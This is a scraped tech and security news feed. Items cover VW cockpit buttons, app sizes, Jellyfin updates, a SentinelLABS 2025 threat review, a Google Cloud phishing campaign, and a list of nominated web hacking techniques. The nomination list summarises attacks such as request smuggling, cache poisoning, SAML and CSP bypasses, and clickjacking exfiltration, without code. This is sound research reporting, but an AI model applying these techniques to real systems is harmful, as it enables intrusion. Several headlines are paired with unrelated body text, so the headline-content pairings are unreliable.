Polo. The new design marks a big departure for VW and features a plethora of physical controls rather than the capacitive buttons on current models. While the switchgear is currently only found on the new ID. Polo, which isn't sold in the United States, it could debut on the soon-to-be-refreshed ID.4.Volkswagen is making a drastic change to its interiors, or at least the interiors of its electric vehicles. The automaker recently unveiled a new cockpit generation with the refreshed ID. Polo—the diminutive electric hatchback that the brand sells in Europe—that now comes with physical buttons.  While VW certainly isn't the only automaker that pushed the envelope with haptic controls and digital buttons, it was a particularly egregious offender. Now, the company is doing a complete 180-degree shift, adding a full suite of physical buttons and switchgear to the Polo's interior. The steering wheel gets new clusters of buttons for cruise control and interacting with music playback, while switches for the temperature and fan speed now live in a row along the dashboard. The move back to buttons doesn't come out of nowhere. Volkswagen already started the shift with the new versions of the Golf and Tiguan models in the United States. Unfortunately, some climate controls, such as those for the rear defrost and the heated seats, are still accessed through the touchscreen. Thankfully, they look to retain their dedicated spot at the bottom of the display. Volkswagen hasn't announced which models will receive the new cockpit design. The redesigned interior also may be limited to the brand's electric vehicles, which would limit it to the upcoming refresh for the ID.4 SUV (and potentially the ID.Buzz), as the only VW EV models currently sold in America. ➡️ Skip the lot.

currently 760.7 MB in size. It is in the top three most bloated
apps out of the top 100 free apps. I don’t use it
on my phone, but I was prompted to compare it with the seemingly hefty one I
(have to) use, Outlook, while clearing up some storage space. Its measly 428 MB
size pales in comparison.This isn’t new. In 2017, Axios
reported
that the top iPhone apps had been taking up an increasing amount of space over
the period from 2013 to 2017. For most of that period, the size of the Gmail
app hovered around 12 MB, with a sudden jump to more than 200 MB near the start
of 2017. Other popular apps also saw a 10x or more increase in size over the
same period.Gmail isn’t even the worst offender, it’s just a more popular one. The Tesla
and Crypto.com apps are around 1 GB each. So is Samsung’s SmartThings app.
What about Google’s other popular apps? Google Home is another hefty one, at
630 MB, that I used for its remote feature, which I replaced with Google TV at
almost a tenth the size. Their other popular apps average around 250
MB in size. This
seems tame in comparison to Microsoft, with an average app size of around
330MB.
For reference, the average size of an app in the top 100 free apps is 280
MB or, in a more expanded set (including
games), 200MB.Just to put this into perspective, on my device, apps (excluding their data)
use up 35 GB, and the data is another 35 GB. iOS takes up another 25 GB. Let’s
say, 100 GB for apps, data and the OS. That leaves me with 20 GB (leaving a
margin of free space for updates) meant to be used for capturing 4K video and
high-quality photos (why else get an iPhone), and storing music (don’t even
think about lossless). The reality is that running out of space also slows
things down, since most of my photos need to be fetched from the cloud before
viewing them, and I need to re-download these hefty offloaded apps when I need
them again. And good luck if you have a limited data bundle.Maybe this doesn’t matter. The latest iPhones start at 256 GB, and surely I’ll
have plenty of space when I get a new one (although I remember saying this when
I upgraded to 64 GB from 32 GB). It’s not really about the space though. These
apps don’t have 50x or even 10x the functionality. But now they’re 100x larger,
and probably slower. Why?Also, can someone explain why Microsoft Authenticator is 150 MB to show 6-digit
codes?It’s not clear if this is specifically an iOS problem. I don’t have an Android
device and I could not find a way to get that information from the Play Store
without a device. That said, I checked the size of Gmail on someone’s Android
phone, and it’s around 185 MB, which certainly seems much better.And if you’re considering switching from the default apps, this is what the
installed size (which differs slightly from the App Store size) is of the
alternatives on my iPhone running iOS 26.2:Passwords - AuthenticatorReminders - Tasks - To DoKeynote - Slides - PowerPointSo, why is the Gmail app almost 80x the size of the native Mail app? My guess
is as good as yours.]]></content:encoded></item><item><title>Vietnam bans unskippable ads</title><link>https://saigoneer.com/vietnam-news/28652-vienam-bans-unskippable-ads,-requires-skip-button-to-appear-after-5-seconds</link><author>hoherd</author><category>dev</category><pubDate>Tue, 6 Jan 2026 16:45:42 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[If things go our way, YouTube’s notorious unskippable ads might be a thing of the past come this February.As  reports, Vietnam recently announced Decree No. 342, which details a number of provisions to the national Advertising Law, due to take effect from February 15, 2026.

This new blog series will regularly basis highlight the ongoing development of Jellyfin and our official clients.
We aim to keep our community informed and engaged, so feel free to share your feedback or thoughts on our progress!December marked Jellyfin's 7th anniversary!
A lot has changed in 7 years, but we remain steadfast in our commitment to Open Source and to being the best personal media server out there.
Special thanks to our developers, testers, moderators, and supporters for your invaluable contributions!
Here's to many more years of collaboration and streaming!We received a substantial amount of feedback regarding our versioning scheme following the 10.11 release, particularly concerning the stability of what are perceived as 'minor' version updates.
This has prompted internal discussions about potentially revising our versioning scheme in the next major release.
While nothing has been finalized yet, we are considering 'dropping' the major version 10, which would make the next release 12.0.
Stay tuned for further updates as we navigate this feedback!Jellyfin 10.11 introduced a major EF Core refactor, consolidating the legacy  into a single unified .
Following more than six months of development and an additional six months of release candidate testing, version 10.11.0 was released last year.
This extended testing period allowed us to mitigate most refactoring and RC-related issues prior to release.Even with this level of testing, issues were expected given the scale of the database change and the limited number of users reporting bugs.
These issues are currently being tracked on GitHub across three categories:We have been moving quickly to address these issues, delivering four additional point releases with over 100 changes since the initial 10.11.0 release.
To date, most point releases have focused on resolving general and migration-related issues.
The remaining migration issues are largely isolated, one-off cases and are unlikely to be resolved.
Most general issues have already been fixed, and the next bug-fix release is expected to include additional fixes for music metadata display issues and for watched status not being preserved when media is replaced or renamed.We are continuing to investigate ways to mitigate performance issues caused by client-side enumeration and filtering of large datasets.Jellyfin Web vNext (aka 10.12 / 12.0)​Default 'Experimental' Layout: The 'Experimental' layout is now enabled by default for all non-TV devices, introducing a new navigation layout and updated UI components.: We are improving theming support by enabling easier runtime customization of default themes through CSS variables and simplifying the process for creating new bundled themes.: Huge thanks to those reviewing, testing, and providing feedback on web pull requests. Your contributions are immensely helpful, as the review burden largely falls on me alone!We're rebranding the desktop application from Jellyfin Media Player to Jellyfin Desktop.
The most noteworthy change is the migration from Qt 5 to Qt 6.
This seems to have improved overall performance, though we're still working out issues regarding memory leaks due to the migration.Apart from the Qt migration, other noteworthy updates.Saved servers and settings will not be migrated from Jellyfin Media Player.We've laid the foundation for switching servers with the addition of profiles CLI options. The long-term goal is to have a UI for this as well, but the timeline is TBD.A slew of bug fixes are included.The release is currently available on Flathub and in the Arch Linux AUR.
Stable builds for Windows and macOS builds are not currently available.
Other Linux distributions will likely be added, though we recommend using Flathub for the time being.
We are not currently supporting Ubuntu 24.04 LTS due to it being stuck on the older Qt 6.4 series, while our new dependency, mpvqt, requires at least Qt 6.5.Two versions of the Android TV app have been released: v0.19.5 and v0.19.6!
These updates contain various improvements to music transcoding. The app now properly displays durations again and allows for seeking when music is transcoding. These changes also solve the issue of lyrics not scrolling in certain cases.For video playback, we have improved the stability of Live TV and now support direct play for the VC-1 and AV1 codecs (if your device supports them). The AV1 support was already available on Android 10 and newer but now works on older Fire TV devices as well.The last two updates brought the long awaited full gamepad support and fixes for 4K and HDR.: Gamepad navigation is now the default navigation type for the Jellyfin for Xbox app and requires a server version of 10.11 or higher to work. However as we cannot switch the input mode type while the app is running, the Jellyfin for Xbox app can no longer connect to older versions than 10.11. As this is a fundamental change in how the app works, there are still a few hiccups like the app not loading correctly and users reporting that the gamepad does not work at all. In those instances we recommend uninstalling and reinstalling the app.: For versions of Jellyfin earlier than 10.11.5 the web UI still runs in the desktop mode, which might look a bit odd. However, with Jellyfin 10.11.5, we have fixed a bug that now correctly sets the web UI to TV mode, so the UI should work a lot better.: For the last few versions, we have been working on enabling 4K and HDR for the app. This is done by integrating with the web UI and switching the HDMI modes. Sadly, this also comes at the cost of not being allowed to run in the background. To enable 4K support, we had to use a feature flag that allocates more video memory to the Jellyfin for Xbox app, making it incompatible with running in the background.: Alongside the shiny new headline features, we have also been working on the code in general, adding small improvements and cleaning up a lot of code. The latest versions added log files and their upload to the Jellyfin server, tighter integrations with the web UI, a settings view that can be expanded for future features, version compatibility checking, a better server connection experience, and more.: When I took over the for the previous maintainer almost a year ago, I made a rough plan for the general development of the app. I always planned on keeping the app as a web wrapper because while the app is certainly more popular than most think, it does not have enough support in development to be a full UWP app. Nevertheless, there are a few features left on my to-do list:Localization to other languagesSubtitle storage on-device3.0.15 was released on 2025-12-18 and is our last release before Roku's year-end publishing blackout. It fixes a bug with HDHomeRun Tuners.Swiftfin 1.4 is out now!​This is a large release with a lot of changes under the hood. Our three highlight changes are:To help organize Issues & PRs, Swiftfin now has milestones to help users identify which changes will be included in each release:Version 1.5Contains issues that should be resolved in version 1.5 of Swiftfin iOS.tvOS ResyncContains tvOS-specific issues that will be resolved as part of our next tvOS Release.Issues that impact tvOS but are part of 1.4 or 1.5 will end up in the version milestone instead of this one. Once tvOS is released, it should mirror our existing 1.X structure and iOS.A more detailed post about these changes can be found on GitHub!The Tizen app was submitted for review, but unfortunately failed testing. Additional work is needed to replicate the reported issues and correct them.Support for multiple  platforms is currently underway, and we will provide updates as progress is made.Wishing you all happy streaming in 2026 and beyond!
We look forward to another year filled with exciting updates and features for Jellyfin.- thornbill and the Jellyfin Team]]></content:encoded></item><item><title>CVE-2026-0640 - Tenda AC23 PowerSaveSet sscanf buffer overflow</title><link>https://cvefeed.io/vuln/detail/CVE-2026-0640</link><author></author><category>vulns</category><pubDate>Tue, 6 Jan 2026 16:15:57 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2026-0640

Among our many research publications during 2025, we exposed North Korean threat actors monitoring the same cyber threat intelligence platforms defenders use to share indicators of compromise, and revealed how a single cryptocurrency phishing operation deployed over 38,000 malicious subdomains across trusted free-tier platforms.2025 also saw artificial intelligence transition from theoretical threat to practical reality, though not in the revolutionary ways many predicted. Instead, AI emerged as a force multiplier, with threat actors weaponizing large language models to scale attacks, generate convincing social engineering content, and automate previously manual processes.These discoveries and others we will explore in this review, exemplify how adversaries have fundamentally changed their operational calculus, treating legitimate infrastructure—from Telegram to free-tier publishing platforms to commercial AI APIs—as essential criminal resources and actively surveilling the defender community’s intelligence-sharing mechanisms.Throughout 2025, SentinelLABS tracked, identified, and disclosed information on these and other critical issues to help organizations and defenders stay ahead of threats to their business operations.All our research and threat intelligence posts can be found on the SentinelLABS home page, but .Key Trends from SentinelLABS Research in 2025: Artificial intelligence matured from a theoretical threat to an operational acceleratorMalTerminalAkiraBot: North Korean operators (Contagious Interview: Highly organized, business-like criminal operations such as  FreeDrainPXA Stealer: Threat actors have increasingly leveraged trusted infrastructure for malicious purposes: Telegram for C2free-tier publishing platforms: Research into Hafnium-linked companiesCensorship as a Service: Through ClickFixfake CAPTCHA pagesfake job offersSentinelLABS researchers uncovered how HellCat and Morpheus ransomware operations were essentially two distinct brands deploying identical ransomware payloads, illustrating the commoditization and rebranding practices within the RaaS ecosystem. This discovery highlighted how affiliates could rebrand the same underlying malware to create the appearance of distinct threat groups, complicating attribution efforts.Our research into a returning phishing campaign revealed the targeting of high-profile accounts on X (formerly Twitter) to promote cryptocurrency scams. The attacks demonstrated the persistent value of compromising social media accounts with large followings for financially motivated threat actors seeking to reach broad audiences with investment fraud schemes.: Understanding how common code is sourced and shared across ransomware groups can inform detection efforts and improve threat intelligence on their operations.In early February, SentinelLABS reported on further variants of the FlexibleFerret DPRK malware family, continuing the Contagious Interview campaign that had been active since November 2023. The research uncovered new infection vectors and samples while also documenting persistent attempts to compromise developers through fake GitHub issues promoting malicious installer scripts.Later in the month, analysis of leaked data from TopSec, a Beijing-based cybersecurity firm, revealed how China’s private sector provides Censorship as a Service to enforce government content monitoring. The leaked work logs showed TopSec delivering bespoke monitoring services to a state-owned enterprise precisely when a corruption investigation was announced, offering rare insight into public-private coordination for managing sensitive events and controlling public opinion in China.February concluded with discovery of a new Ghostwriter campaign targeting both the Ukrainian government and, for the first time, Belarusian opposition groups. The long-running threat activity cluster deployed weaponized Excel documents with lures crafted to appeal to government officials and opposition activists, marking an expansion of the campaign’s targeting scope.: The TopSec leak reveals how China’s private cybersecurity sector directly enables state surveillance and censorship operations, highlighting the interconnected nature of commercial security firms and government offensive capabilities.March was marked by several significant ransomware developments. Mid-month, SentinelLABS reported on Dragon RaaS, a pro-Russian hacktivist group attempting to build on the reputation of “The Five Families” cybercrime ecosystem. The group’s emergence reflected the continued  fragmentation and rebranding within ransomware operations.The month also saw publication of research on ReaderUpdate, a macOS malware loader that had been largely dormant since 2023. New samples showed the threat actors had expanded the loader’s capabilities by adding Go to its existing arsenal of Crystal, Nim, and Rust variants, creating a “melting pot” of macOS malware designed to evade detection through diverse implementation languages.: ReaderUpdate’s use of multiple programming languages (Crystal, Nim, Rust, Go) presents unique challenges for detection and analysis, necessitating detection strategies that focus on behavior and artifacts rather than language-specific signatures.Since September 2024, the bot had targeted more than 400,000 websites and successfully spammed at least 80,000 sites promoting dubious SEO services. The framework’s sophistication, including multiple CAPTCHA bypass mechanisms and network detection evasion techniques, illustrated how AI lowers barriers for scaled attacks even when the underlying criminal objective remains straightforward.Later in the month, SentinelLABS published research on what it takes to defend a top-tier cybersecurity company from today’s adversaries. Drawing on SentinelOne’s own experiences as a target of advanced persistent threats, the research provided insight into the resources and capabilities required to protect organizations that themselves represent high-value targets for nation-state actors seeking to compromise security vendors.: AI-generated content in AkiraBot bypasses traditional spam filters by creating unique messages for each target, exposing the challenges AI poses to traditional website spam defenses.May opened with our reporting on DragonForce, a ransomware gang that had completed its transformation from Pro-Palestine hacktivist operation to profit-driven extortion enterprise. The group introduced a “white-label” branding service in early 2025, allowing affiliates to rebrand DragonForce ransomware as different strains for additional fees, marking a new level of commercialization within the RaaS ecosystem.Shortly afterward, SentinelLABS and Validin unveiled FreeDrain at PIVOTcon. Our collaboration exposed an industrial-scale cryptocurrency phishing operation using SEO manipulation and over 38,000 distinct subdomains across free publishing platforms. The investigation began with a victim who lost approximately $500,000 worth of Bitcoin and expanded to reveal a professional criminal enterprise operating during standard business hours from the UTC+05:30 timezone, systematically stealing digital assets through multilayered redirection techniques.Anti-Ransomware Day 2025 marked the sobering milestone of ten years of Ransomware-as-a-Service, now a billion-dollar criminal industry. SentinelLABS’ retrospective examined how RaaS operations had evolved from early experiments into sophisticated criminal enterprises with mature business models, customer service, and ongoing innovation.A busy month for our researchers concluded with documentation of ClickFix techniques embedding fraudulent CAPTCHA images on compromised websites. We shared original findings from SentinelOne investigations, including infection chains and technical artifacts not previously reported.: FreeDrain’s abuse of thousands of subdomains on trusted free-tier platforms demonstrates that without stronger default safeguards, identity verification, or proper abuse response infrastructure, free publishing platforms will continue to be abused, undermining user trust and inflicting real-world financial harm.SentinelLABS expanded on its earlier research on adversaries targeting top-tier organizations, detailing a China-nexus threat actor’s reconnaissance operation against SentinelOne itself that had occurred in October 2024 and extended into 2025. The research highlighted adversaries’ persistent focus on compromising cybersecurity vendors and high-value targets.Also in June, we reported on Katz Stealer, an emerging Malware-as-a-Service platform targeting credentials and crypto assets. Advertised on BreachForums in April 2025, Katz Stealer followed the established RaaS business model, offering services to affiliates for upfront fees and demonstrating the continued commercialization of information stealer operations.We reported on two separate Mac-focused campaigns in June, attributed in turn to China and North Korean threat actors. Our researchers found evidence of macOS.ZuRu’s re-emergence with a modified Khepri C2 framework concealed inside a trojanized version of the legitimate Termius SSH client. We also detailed intrusions attributed to DPRK activity and the macOS NimDoor malware family: a Nim-based backdoor specifically designed to target Web3 and crypto platforms. The research extended understanding of North Korean threat actors’ evolving macOS malware playbook and their persistent focus on the cryptocurrency sector.: DPRK’s exploration of lesser-known languages in order to introduce analysis complexity requires security engineers to invest equal effort in understanding the affordances such languages offer threat actors.One of the year’s most significant zero-day disclosures was revealed when Microsoft confirmed active exploitation of SharePoint ToolShell (CVE-2025-53770) on July 19th, two days after SentinelOne first observed ToolShell exploitation. SentinelLABS researchers subsequently documented targeted exploitation against high-value organizations in technology consulting, manufacturing, critical infrastructure, and professional services.The vulnerability enabled unauthenticated remote code execution through crafted POST requests, with attacks occurring before public disclosure spurred mass exploitation. Further research found multiple state-aligned threat actors beginning reconnaissance and early-stage exploitation activities.Later in July, following Department of Justice indictments of two hackers working for China’s Ministry of State Security, SentinelLABS identified more than ten patents for highly intrusive forensics and data collection technologies registered by companies linked to the Hafnium (Silk Typhoon) threat actor group.The patents revealed previously unreported offensive capabilities including encrypted endpoint data acquisition, mobile forensics, and network traffic collection, exposing the sophisticated technical infrastructure supporting China’s APT operations and highlighting critical gaps in traditional campaign-focused attribution.: Campaign-focused attribution misses the full picture. Understanding the companies behind attacks and their documented capabilities, not just observed behavior, is essential for comprehensive threat intelligence.In early August, SentinelLABS and Beazley Security exposed the PXA Stealer campaign, a Python-based operation that had infected more than 4,000 unique victims across 62 countries. The stolen data included over 200,000 passwords, hundreds of credit card records, and more than 4 million browser cookies, and was monetized through a Vietnamese-speaking cybercriminal ecosystem using Telegram APIs. The campaign demonstrated increasingly advanced tradecraft with nuanced anti-analysis techniques, non-malicious decoy content, and hardened command-and-control infrastructure.This month, SentinelLABS also exposed widespread smart contract scams, where actors advertised crypto trading bots concealing malicious contracts designed to drain user wallets. Promoted through fake YouTube channels and AI-generated videos, the scams demonstrated how threat actors leverage social media and emerging technologies to lend legitimacy to financial fraud schemes.: Stealer campaigns have become increasingly automated and supply-chain integrated. PXA Stealer exemplifies a growing trend in which legitimate infrastructure is weaponized at scale.The research revealed coordinated teams using Slack for real-time collaboration and rapidly deploying replacement infrastructure when services took down their assets. Between January and March 2025 alone, our efforts identified more than 230 victims, predominantly cryptocurrency professionals, with the actual number likely significantly higher.Later in September, SentinelLABS published groundbreaking research on hunting for LLM-enabled malware. Facing the challenge that malware offloading functionality to AI could generate unique code at runtime and evade traditional detection, our researchers developed novel methodologies based on embedded API key detection and specific prompt structure patterns.This approach successfully identified previously unknown samples including MalTerminal, potentially the earliest known example of LLM-enabled malware. Despite initial concerns about detection challenges, the research showed how defenders could reliably hunt for and detect these emerging threats.: LLM-enabled malware is still in a nascent stage, giving defenders an opportunity to learn from attackers’ mistakes and adjust their approaches accordingly.In late October, following intelligence shared by the Digital Security Lab of Ukraine, SentinelLABS investigated PhantomCaptcha, a coordinated single-day spearphishing operation launched on October 8th targeting organizations critical to Ukraine’s war relief efforts.The threat actors used emails impersonating the Ukrainian President’s Office carrying weaponized PDFs, luring victims into executing malware via a ‘ClickFix’-style fake Cloudflare captcha page. The final payload was a multi-stage WebSocket RAT, hosted on Russian-owned infrastructure,  with an array of offensive features including arbitrary remote command execution, data exfiltration, and the potential deployment of additional malware.The campaign reflects a highly capable adversary with extensive operational planning, compartmentalized infrastructure, and deliberate exposure control. The six-month period between initial infrastructure registration and attack execution, followed by the swift takedown of user-facing domains while maintaining backend command-and-control, indicates an operator well-versed in both offensive tradecraft and defensive detection evasion.: User awareness training on “ClickFix”-style social engineering techniques can help prevent attacks using this infection vector. PowerShell logging provides visibility into commands using hidden window styles, execution policy bypasses, or attempts to disable command history logging, while network security teams can monitor for WebSocket connections to recently-registered or suspicious domains.As part of our efforts to empower the community at large through research and adversary exposure, SentinelLABS also develops and releases open source tooling. In November, we released a Synapse Rapid Power Up for Validin to improve campaign discovery at scale. Our research showed how modern intelligence platforms could accelerate identification of threat campaigns through infrastructure correlation and automated discovery techniques.Using the LaundryBear and FreeDrain campaigns as case studies, we explored how the sentinelone-validin power-up leverages Validin’s multi-source enrichment and HTTP fingerprinting to reveal wider campaign infrastructure within Synapse from just a handful of indicators.The tool makes it easier to follow how infrastructure changes over time, trace shared resources across campaigns, and connect what might first appear as isolated indicators. With this richer context available directly in Synapse, analysts can move from collection to understanding with greater speed and confidence in their conclusions.: Modern adversaries rotate domains and replicate infrastructure templates, which can limit the value of isolated indicators. Analysts need time-aware, cross-source analysis to identify shared traits and connect related assets.Early in December, SentinelLABS released its forward-looking “Cybersecurity 2026” forecast, examining the year ahead in AI, adversaries, and global change. The analysis drew on trends observed throughout 2025 to project how the threat landscape would continue evolving.This month we also traced how two hackers progressed from Cisco Academy students to orchestrating Salt Typhoon attacks, providing rare insight into how technical education can be perverted toward malicious ends and highlighting the danger of threat actors emerging from legitimate training programs.December also saw reporting on CyberVolk’s return with VolkLocker. The pro-Russian hacktivist collective continued its pattern of reusing, tweaking, and rebranding leaked ransomware source code.The year concluded with comprehensive research on how large language models impact ransomware operations. The analysis found that while LLMs are being adopted by crimeware actors, they serve as operational accelerators rather than revolutionary tools, streamlining reconnaissance, improving phishing, and speeding up attack stages without fundamentally changing ransomware methodology.: With today’s LLMs, the risk is not superintelligent malware but industrialized extortion, requiring defenders to adapt to faster operational tempo rather than novel capabilities.2025 saw the cybersecurity landscape defined not by revolutionary changes but by the acceleration of existing threats. AI has emerged not as a game-changer but as a force multiplier, amplifying attacks across the spectrum.Meanwhile, cybercriminals operate industrial-scale operations with professional infrastructure, business hours, and customer service models much like legitimate enterprises, and nation-state actors monitor the same intelligence platforms defenders use, turning the information security community’s own tools into reconnaissance resources.Our research over the last 12 months has also found an adversary landscape in which attribution has become increasingly complex, and the line between hacktivist and profit-motivated operations continues to blur. From the 38,000 phishing subdomains of FreeDrain to the coordinated teams behind Contagious Interview monitoring threat intelligence platforms, threat actors have shown both adaptability and operational maturity.SentinelLABS’ discoveries throughout 2025 underscore the critical need for a collaborative, intelligence-driven approach to cybersecurity. As we move into 2026, defenders will find themselves in an environment where trust models require reevaluation,  adversaries demonstrate sophisticated awareness of defensive operations, and the weaponization of legitimate services demands new detection paradigms.]]></content:encoded></item><item><title>Critical AdonisJS Vulnerability Allow Remote Attacker to Write Files On Server</title><link>https://cybersecuritynews.com/adonisjs-vulnerability-write-files-on-server/</link><author></author><category>security</category><pubDate>Tue, 6 Jan 2026 15:48:57 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

Over the last year, security researchers have shared a huge amount of work with the community through blog posts, presentations, and whitepapers. This is great, but it also means genuinely reusable techniques can get buried, and even flashy findings eventually get eclipsed as everyone chases the next shiny logo.

Since 2006, the community has come together each year to turn that firehose into two useful resources:

- A lightly curated list of notable web security research from the last year
- A focused top ten of the most valuable, must-read work

If you want to dig through past nominees and winners or learn more about the project history, check out the full project archive. Otherwise, read on to find out how to make your nominations for 2025.

This year, we'll target the following timeline:

### Timeline

- Jan 6-13: Collect community nominations for the top research from 2024
- Jan 14-21: Community votes on nominations to build a shortlist of the top 15
- Jan 22: Launch panel vote on shortlist to select and order the 10 finalists
- Feb 03: Publish top 10 web hacking techniques of 2025!

### What should I nominate?

The aim is to highlight research containing novel, practical techniques that can be re-applied to different systems. Individual vulnerabilities like log4shell are valuable at the time but typically age poorly, whereas underlying techniques such as JNDI Injection can be reapplied to great effect. Nominations can also be refinements to already-known attack classes, such as Exploiting XXE with Local DTD Files. For further examples, you might find it useful to check out previous year's top 10s.

### Making a nomination

To submit, simply provide a URL to the research, and an optional brief comment explaining what's novel about the work. Feel free to make as many nominations as you like, and nominate your own work if you think it's worthy!

#### Click here to submit a nomination

Please note that I'll filter out nominations that are non-web focused, just tools, or not clearly innovative to keep the number of options in the community vote manageable. We don't collect email addresses - to get notified when the voting stage starts, follow @PortSwiggerRes on X, LinkedIn, or BlueSky.

### Join the community

We'd love to hear from you! If you have any questions or you'd like to discuss this year's batch of research, join us in the #research channel on the PortSwigger Discord.

### Nominations - last updated 2026-01-06

I've made a few nominations myself to get things started, and I'll update this list with fresh community nominations every few days. I've included AI-assisted summaries of each entry.

Eclipse on Next.js: Conditioned exploitation of an intended race-condition

Racing Next.js’s response-cache batcher by forcing disparate failing requests to collide on a shared error cache-key, leaking a transient pageProps HTML variant that can then be externally cached for poisoning-to-SXSS despite prior fixes.
Next.js, cache, and chains: the stale elixir

Chaining a spoofable framework-internal header with Next.js data-request mechanisms to force-cache SSR JSON as HTML, enabling cache-poisoning DoS and stored XSS via stale-while-revalidate.
Unexpected security footguns in Go's parsers

Chaining Go’s case-insensitive JSON key matching, last-wins duplicate keys, and XML’s tolerance for leading/trailing garbage to craft cross-format polyglot inputs that different services/parsers interpret differently, enabling authz/authn bypasses.
HTTP/1.1 must die: the desync endgame

Leveraging Expect handling quirks and early-response gadgets to turn 0.CL deadlocks into reliable double-desync request smuggling that enables response queue poisoning and cross-tenant cache/content hijacking.
Under the Beamer

Chaining Chromium HTMLCollection DOM clobbering with a library-driven node-removal gadget to null out an escaping function at runtime, then pivoting into an innerHTML iframe-attribute injection sink to bypass DOMPurify and get XSS.
Opossum Attack

Cross-protocol application-layer desynchronization by MITM-switching a victim’s implicit TLS connection onto an opportunistic TLS upgrade endpoint to inject pre-handshake messages and permanently misalign request/response streams.
The Fragile Lock: Novel Bypasses For SAML Authentication

Void Canonicalization: forcing canonicalization to error so signature-digest code treats the signed data as empty, combined with parser namespace/attribute inconsistencies to make signature verification and assertion processing diverge for full SAML auth bypass.
Funky chunks: abusing ambiguous chunk line terminators for request smuggling

Abusing chunked-body line-terminator ambiguity inside ignored chunk extensions and oversized-chunk spill to create new request-smuggling differentials (including the newly identified EXT.TERM and spill-based variants) without relying on Content-Length vs Transfer-Encoding confusion.
Funky chunks – addendum: a few more dirty tricks

New HTTP request smuggling primitives exploiting chunked parsing discrepancies via two-byte chunk-body terminator overreads and ambiguous trailer-section newline handling (including request merging enabled by early-response gadgets).
Cross-Site WebSocket Hijacking Exploitation in 2025

Leveraging CSWSH via WebSocket-accessible GraphQL to bypass preflight-gated CSRF protections, plus showing that Private Network Access doesn’t apply to WebSockets so cross-origin WebSockets can still reach private-IP services.
SVG Filters - Clickjacking 2.0

Abusing SVG filter pipelines on cross-origin iframes to read selected pixels and implement logic-gated, multi-step interactive clickjacking with exfiltration via user-scanned QR codes generated entirely inside the filter.
Nonce CSP bypass using Disk Cache

Forcing bfcache to fall back to disk cache to reuse a leaked CSP nonce (via CSS exfiltration) while recaching only the injectable fetched content through cache-key manipulation, enabling nonce-based CSP bypass.
Novel SSRF Technique Involving HTTP Redirect Loops

Exploiting redirect-loop status-code variation (cycling uncommon 3xx responses) to trigger an application error state that leaks the full SSRF redirect chain and final 200 response.
Lost in Translation: Exploiting Unicode Normalization

Weaponizing Unicode normalization mismatches (virtual confusables/best-fit mappings and truncation/overflow edge cases) to bypass validation and turn benign input into malicious behavior.
SOAPwn: Pwning .NET Framework Applications Through HTTP Client Proxies And WSDL

Abusing .NET SOAP proxy generation from attacker-supplied WSDL to set a non-HTTP scheme that turns SOAP invocations into arbitrary file writes (and NTLM relay) culminating in webshell/script drop RCE.
Forcing Quirks Mode with PHP Warnings + CSS Exfiltration without Network Requests

Triggering quirks mode via early PHP warnings to relax same-origin stylesheet MIME checks, then using 404-reflected text as a CSS sink plus :valid-based regex matching and frame-counting as a no-request oracle to exfiltrate secrets under CSP.
ORM Leaking More Than You Joined For

Abusing Beego’s filter-expression segment-overwrite quirk to smuggle disallowed fields past partial validation, plus Prisma auth bypass via type confusion that coerces user input into operator objects through common request parsers.]]></content:encoded></item><item><title>Critical Dolby Codec Vulnerability Exposes Android Devices to Code Execution Attacks</title><link>https://cybersecuritynews.com/dolby-codec-android-vulnerability/</link><author></author><category>security</category><pubDate>Tue, 6 Jan 2026 15:29:46 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

New customers currently receive free credits, which lowers the barrier to entry and may attract some cybercriminals.The initial email arrives from what looks like a real Google address and references something routine and familiar, such as a voicemail notification, a task to complete, or permissions to access a document. The email includes a link that points to a genuine Google Cloud Storage URL, so the web address appears to belong to Google and doesn’t look like an obvious fake.After the first click, you are redirected to another Google‑related domain () showing a CAPTCHA or image check. Once you pass the “I’m not a robot check,” you land on what looks like a normal Microsoft 365 sign‑in page, but on close inspection, the web address is not an official Microsoft domain.Any credentials provided on this site will be captured by the attackers.The use of Google infrastructure provides the phishers with a higher level of trust from both email filters and the receiving users. This is not a vulnerability, just an abuse of cloud-based services that Google provides.Google said it has taken action against the activity:“We have blocked several phishing campaigns involving the misuse of an email notification feature within Google Cloud Application Integration. Importantly, this activity stemmed from the abuse of a workflow automation tool, not a compromise of Google’s infrastructure. While we have implemented protections to defend users against this specific attack, we encourage continued caution as malicious actors frequently attempt to spoof trusted brands. We are taking additional steps to prevent further misuse.”We’ve seen several phishing campaigns that abuse trusted workflows from companies like Google, PayPal, DocuSign, and other cloud-based service providers to lend credibility to phishing emails and redirect targets to their credential-harvesting websites.Campaigns like these show that some responsibility for spotting phishing emails still rests with the recipient. Besides staying informed, here are some other tips you can follow to stay safe.Always check the actual web address of any login page; if it’s not a genuine Microsoft domain, do not enter credentials.​ Using a password manager will help because they will not auto-fill your details on fake websites.Be cautious of “urgent” emails about voicemails, document shares, or permissions, even if they appear to come from Google or Microsoft.​ Creating urgency is a common tactic by scammers and phishers.Go directly to the service whenever possible. Instead of clicking links in emails, open OneDrive, Teams, or Outlook using your normal bookmark or app. so that stolen passwords alone are not enough, and regularly review which apps have access to your account and remove anything you don’t recognize.Pro tip: Malwarebytes Scam Guard can recognize emails like this as scams. You can upload suspicious text, emails, attachments and other files and ask for its opinion.

The overall average is 28 points. That’s a 27% performance premium for negativity. This finding comes from an empirical study I’ve been running on HN attention dynamics, covering decay curves, preferential attachment, survival probability, and early-engagement prediction. The preprint is available on SSRN. I already had a gut feeling. Across 32,000 posts and 340,000 comments, nearly 65% register as negative. This might be a feature of my classifier being miscalibrated toward negativity; yet the pattern holds across six different models. I tested three transformer-based classifiers (DistilBERT, BERT Multi, RoBERTa) and three LLMs (Llama 3.1 8B, Mistral 3.1 24B, Gemma 3 12B). The distributions vary, but the negative skew persists across all of them (inverted scale for 2-6). The results I use in my dashboard are from DistilBERT because it runs efficiently in my Cloudflare-based pipeline.What counts as “negative” here? Criticism of technology, skepticism toward announcements, complaints about industry practices, frustration with APIs. The usual. It’s worth noting that technical critique reads differently than personal attacks; most HN negativity is substantive rather than toxic. But, does negativity cause engagement, or does controversial content attract both negative framing and attention? Probably some of both.I’ll publish the full code, dataset, and a dashboard for the HN archiver soon and I’m happy to send you an update:Alternatively, you can also subscribe to the RSS 